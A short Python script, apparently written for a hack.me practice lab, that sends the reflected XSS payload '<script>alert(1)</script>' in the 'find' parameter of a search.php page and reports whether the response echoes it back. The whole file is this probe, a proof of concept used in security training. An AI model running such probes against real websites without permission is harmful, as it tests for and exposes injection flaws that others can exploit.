#!/usr/bin/python3

import requests

def connect(url, endpoint):
    # find=test&searching=yes

    payload = "<script>alert(1)</script>"
    arg = f"?find={payload}&searching=yes"

    r = requests.get(url + endpoint + arg)

    if payload in r.text:
        print("[INFO] XSS successful!")
    else:
        print("[ERROR] Failed!")


if __name__ == '__main__':
    url = "http://s159369-101060-393.sipontum.hack.me"
    endpoint = "/search.php"

    connect(url, endpoint)